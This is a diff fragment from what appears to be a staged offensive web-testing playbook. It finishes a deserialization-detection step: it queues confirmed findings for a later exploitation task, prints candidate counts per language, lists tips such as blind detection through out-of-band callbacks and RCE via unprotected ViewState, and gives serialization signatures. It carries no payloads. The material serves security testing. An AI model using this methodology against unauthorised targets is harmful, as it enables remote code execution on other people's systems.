+    echo "" >> outputs/queue_deser_exploitation.txt
+fi
+
+# Add confirmed (from error detection)
+if [ -f outputs/deser/deser_confirmed.txt ]; then
+    echo "## Confirmed Deserialization (Priority)" >> outputs/queue_deser_exploitation.txt
+    cat outputs/deser/deser_confirmed.txt >> outputs/queue_deser_exploitation.txt
+fi
+
+echo "[*] Queue built: outputs/queue_deser_exploitation.txt"
+
+================================================================================
+SUMMARY & STATISTICS
+================================================================================
+
+echo ""
+echo "=========================================="
+echo "TASK 76 SUMMARY - Deserialization Detection"
+echo "=========================================="
+echo "Java candidates:     $(wc -l < outputs/deser/java_deser_candidates.txt 2>/dev/null || echo 0)"
+echo "PHP candidates:      $(wc -l < outputs/deser/php_deser_candidates.txt 2>/dev/null || echo 0)"
+echo "Python candidates:   $(wc -l < outputs/deser/python_deser_candidates.txt 2>/dev/null || echo 0)"
+echo ".NET candidates:     $(wc -l < outputs/deser/dotnet_deser_candidates.txt 2>/dev/null || echo 0)"
+echo "ViewState targets:   $(wc -l < outputs/deser/viewstate_targets.txt 2>/dev/null || echo 0)"
+echo "Confirmed vulns:     $(wc -l < outputs/deser/deser_confirmed.txt 2>/dev/null || echo 0)"
+echo ""
+echo "Exploitation queue: outputs/queue_deser_exploitation.txt"
+echo "Next: Task 77 - Deserialization Exploitation"
+
+================================================================================
+⚠️ COMMON MISTAKES TO AVOID ⚠️
+================================================================================
+
+❌ Only testing Java deserialization
+   → PHP, Python, .NET, Ruby all have exploitable deserializers
+
+❌ Not using DNS/OOB callbacks for detection
+   → Many deser vulnerabilities are blind
+
+❌ Forgetting ViewState
+   → ASP.NET apps with unprotected ViewState = easy RCE
+
+❌ Ignoring serialized cookies
+   → Flask, Rails, Laravel often serialize session data
+
+❌ Not checking tech stack first
+   → Target the right language/framework
+
+================================================================================
+📚 REFERENCE: SERIALIZATION SIGNATURES
+================================================================================
+
+Java ObjectInputStream:   AC ED 00 05 (hex) / rO0AB (base64)
+Java XMLDecoder:          <java> ... </java>
+PHP serialize():          O:4:"name":2:{...}  / a:2:{...}
+Python Pickle (p0):       (dp0\n / cos\n
+Python Pickle (p2+):      \x80\x02 / \x80\x03 / \x80\x04
+.NET BinaryFormatter:     00 01 00 00 00 FF FF FF FF
+.NET ViewState:           /wE (base64)
+Ruby Marshal:             \x04\x08
+Node serialize:           _$$ND_FUNC$$_
